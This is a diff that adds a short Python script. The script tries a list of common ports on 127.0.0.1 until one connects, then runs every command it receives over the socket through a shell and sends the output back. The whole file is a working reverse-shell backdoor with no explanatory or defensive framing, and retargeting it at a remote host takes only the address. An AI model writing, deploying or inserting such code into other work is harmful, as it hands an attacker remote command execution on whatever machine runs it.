@@ -1,0 +1,24 @@
+import socket,time,subprocess
+mysocket=socket.socket()
+connected=False
+while not connected:
+    for port in [21,22,80,443,8000]:
+        time.sleep(1)
+        try:
+           print("Trying",port,end=" ")
+           mysocket.connect(("127.0.0.1",port))
+        except socket.error:
+           print("Nope")
+           continue
+        else:
+           print("Connected")
+           connected=True
+           break
+
+while True:
+     command = mysocket.recv(1024)
+     p=subprocess.Popen(command ,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
+     results,errors = p.communicate()
+     results = results+errors
+     mysocket.send(results)
+
